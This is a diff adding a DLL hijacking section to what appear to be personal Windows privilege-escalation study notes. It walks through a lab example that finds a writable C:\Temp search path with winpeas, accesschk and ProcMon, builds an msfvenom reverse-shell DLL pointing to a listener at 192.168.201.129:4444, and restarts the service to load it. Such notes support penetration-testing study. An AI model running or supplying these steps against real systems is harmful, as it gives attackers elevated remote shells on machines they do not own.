@@ -118,3 +118,36 @@ Kernal Exploits
       6. Start the service
       net start filepermsvc
    5. DLL Hijacking
+      Services will try to load funtionality from a library called a DLL. Whatever the funtionality the DLL provides will be executed with the same privileges as the service that loaded it.
+      If a DLL is loaded with an absolute path, we may be able to escalate privileges if the DLL is writable
+      If a DLL is missing from the system and we have write privileges to the directory within the PATH, we may be able to escalate privileges
+      Usually a very manual process
+      EXAMPLE!!!
+      1. winpeas detected (DLL Hijacking) C:\Temp: Authenticated Users [WriteData/CreateFiles] and non-Microsoft service dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"]
+      (to save time, we are only checking the dllsvc)
+      2. check both for start/stop access
+      .\accesschk.exe /accepteula -uvqc dllsvc
+      3. check for the .exe the service needs to run
+      sc qc dllsvc
+      4. Copy the .exe off the host and analyze it with a user with admin rights
+      Analyze with ProcMon64.exe
+        stop and clear the current capture
+        add the dllhijackservice.exe
+        remove registry and network activity filters
+      5. Start the service
+      net start dllsvc
+      6. Check Procmon activity
+      It is trying to find the file in the C:\Temp directory, which is writable by us.
+      7. Generate reverse shell with DLL format
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.201.129 LPORT=4444 -f dll -o hijackme.dll
+      copy it to the C:\Temp folder since Procmon found that it checks there.
+      6. Stop the service
+      net stop dllsvc
+      7. Start the service
+      net start dllsvc
+      
+      
+      
+      
+      
+      
